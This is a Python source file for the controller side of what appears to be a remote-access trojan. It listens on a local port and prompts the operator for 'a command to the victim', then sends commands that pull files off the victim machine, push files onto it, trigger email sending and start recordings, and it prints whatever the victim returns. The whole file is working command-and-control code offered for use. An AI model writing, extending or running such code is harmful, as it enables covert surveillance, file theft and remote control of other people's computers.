import socket


def server():
    s = socket.socket()
    s.bind(('127.0.0.1', 9984))

    s.listen(1)
    server_socket, adress = s.accept()
    print("Connection from: " + str(adress))

    while True:
        command = input('Please enter a command to the victim\n')
        # ind = command.index(' ')
        # action = command.substring(0, ind)
        # params = command.substring(ind, len(command)-1)
        # send(command)
        # if action == "getfile":
        #
        #
        #
        # elif action == 'downloadfile':
        #
        server_socket.send(command.encode('utf-8'))

        if command.startswith('get file '):
            data = None
            file_path = input("Please enter the path of the file\n")
            with open(file_path, 'wb')as f:
                print('Open File')
                while True:
                    data = server_socket.recv(1024)
                    if not data or len(data) < 1024:
                        if data:
                            f.write(data)
                        f.flush()
                        f.close()
                        break
                    f.write(data)
        elif command.startswith('download file '):
            command = command[14:-1] + command[-1]
            victim_path = input('Where do you want to save the file\n')
            server_socket.sendall(victim_path.encode('utf-8'))
            f = open(command, 'rb')
            while True:
                content = f.read(1024)
                if content:
                    server_socket.sendall(content)
                else:
                    f.close()
                    break
        elif command.startswith('send email '):
            data = server_socket.recv(1024).decode('utf-8')
            print(data)

        elif command.startswith('take record '):
            command = command[12:-1] + command[-1]
            server_socket.sendall(command.encode('utf-8'))
            path = input("Where do you want save the file\n")
            server_socket.sendall(path.encode('utf-8'))



        else:
            data = server_socket.recv(1024).decode('utf-8')
            print(data)

    server_socket.close()


if __name__ == '__main__':
    server()
